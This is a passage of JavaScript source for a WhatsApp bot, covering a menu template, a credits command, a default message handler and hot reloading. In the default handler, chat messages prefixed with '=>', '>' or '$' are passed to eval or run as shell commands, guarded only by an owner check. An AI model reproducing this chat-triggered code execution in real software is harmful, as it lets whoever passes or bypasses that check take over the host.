  let message = await prepareWAMessageMedia({ video: fs.readFileSync('./BotMedia/menu.mp4'), gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `${global.fake}`,
           hydratedButtons: [{
                                urlButton: {
                                    displayText: 'YouTube📍',
                                    url: 'https://youtu.be/imFIX-Wrt3s'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '👤Owner👤',
                                    id: `${prefix}owner`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
break

case '7energycontribution': case '7tqtt': case '7tqto': case '7thanksto': case '7thankto': 
m.reply(global.tqto)
break

//GET EMAIL TEMPORARY



 default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return reply(bang)
                    }
                    try {
                        reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await reply(evaled)
                    } catch (err) {
                        await reply(String(err))
                      
                   }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return reply(err)
                        if (stdout) return reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		   if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.database
		    if (!(budy.toLowerCase() in msgs)) return
		   XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
